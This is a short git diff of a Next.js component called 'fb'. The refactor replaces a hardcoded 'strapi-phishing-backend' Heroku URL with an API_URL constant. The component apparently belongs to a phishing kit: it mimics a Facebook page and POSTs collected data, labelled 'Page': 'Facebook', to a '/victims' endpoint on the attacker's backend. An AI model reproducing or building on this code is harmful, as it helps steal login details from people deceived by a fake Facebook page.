@@ -3,6 +3,7 @@ import React, { useState } from "react";
 import router, { Router, useRouter } from "next/router";
 import styles from "../styles/fb.module.css";
 import Head from "next/head";
+import { API_URL } from "../utils/urls";
 
 
 const fb = () => {
@@ -23,7 +24,7 @@ const fb = () => {
             "users_permissions_user": id,
             "Page": "Facebook"
         }
-        fetch("https://strapi-phishing-backend.herokuapp.com/victims", {
+        fetch(`${API_URL}/victims`, {
             method: "POST",
             body: JSON.stringify(data),
             headers: { "Content-Type": "application/json "},
